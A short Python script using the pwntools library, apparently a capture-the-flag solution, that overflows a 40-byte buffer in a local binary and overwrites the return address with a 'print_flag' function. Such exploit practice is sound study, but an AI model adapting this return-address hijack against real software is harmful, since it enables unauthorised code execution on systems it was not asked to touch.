from pwn import *

ex = "./hi"
elf = ELF(ex)
p = process(ex)

offset = 40
buffer = b'A' * offset

address = p64(elf.symbols["print_flag"])

msg = buffer + address

p.sendline(msg)
out = p.recvall()

print(out)
